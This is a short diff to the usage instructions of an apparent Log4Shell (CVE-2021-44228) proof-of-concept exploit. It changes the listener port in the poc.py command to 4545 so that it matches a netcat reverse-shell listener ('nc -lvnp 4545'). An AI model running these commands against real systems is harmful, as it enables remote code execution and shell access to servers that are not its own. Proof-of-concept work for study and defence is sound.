@@ -20,7 +20,7 @@ nc -lvnp 4545
 
 ```py
 $pip3 install -r requirements.txt
-$ python3 poc.py --userip localhost --webport 8000 --lport 9001
+$ python3 poc.py --userip localhost --webport 8000 --lport 4545
 
 [!] CVE: CVE-2021-44228
 
